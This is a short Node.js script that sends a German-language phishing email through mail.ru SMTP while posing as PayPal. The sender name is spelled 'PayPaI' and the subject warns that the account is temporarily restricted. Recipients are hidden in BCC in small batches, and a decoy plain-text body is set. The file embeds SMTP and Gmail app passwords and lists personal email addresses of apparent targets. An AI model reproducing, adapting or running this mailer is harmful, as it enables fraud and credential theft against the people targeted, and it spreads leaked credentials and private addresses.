const nodemailer = require("nodemailer");
const fs = require("fs");

// HTML-Mail laden
const html = fs.readFileSync("./mail-de.html", "utf8");

// MAIL.RU DATEN (NEUTRAL!)
const MAILRU_USER = "paypal.service.login@mail.ru";
const MAILRU_PASS = "s6IA8yR1bVh8ck0he222";

// EMPFÄNGER (max. 3–5)
const BCC_RECIPIENTS = [
  "luishoelzer02@gmail.com",
  
];

async function main() {
  const transporter = nodemailer.createTransport({
    host: "smtp.mail.ru",
    port: 465,
    secure: true,
    auth: {
      user: MAILRU_USER,
      pass: MAILRU_PASS,
    },
  });

  await transporter.verify();
  console.log("Mail.ru SMTP Login OK");

  const info = await transporter.sendMail({
    from: `"PayPaI" <${MAILRU_USER}>`,
    to: MAILRU_USER,      // immer setzen
    bcc: BCC_RECIPIENTS,
    subject: "Konto vorübergehend eingeschränkt",
    text: "Hi, kurze private Nachricht von mir.",
    html,
  });

  console.log("Gesendet:", info.messageId);
}

main().catch(console.error);

//const GMAIL_USER = "paypai.service.benz@gmail.com";
//const GMAIL_APP_PASS = "osrvqiudzzybrjum";
//const GMAIL_USER = "paypai.service.holz@gmail.com";
//const GMAIL_APP_PASS = "drjcwcxucdumiaqn";
//"ghostskills10@gmail.com",
//"ghostskills10@gmail.com",
 // "Fabianmaurice1998@gmail.com",
 // "dimonchikbrate@gmail.com",
// "paypal.service.login@mail.ru";
//const MAILRU_PASS = "s6IA8yR1bVh8ck0he222";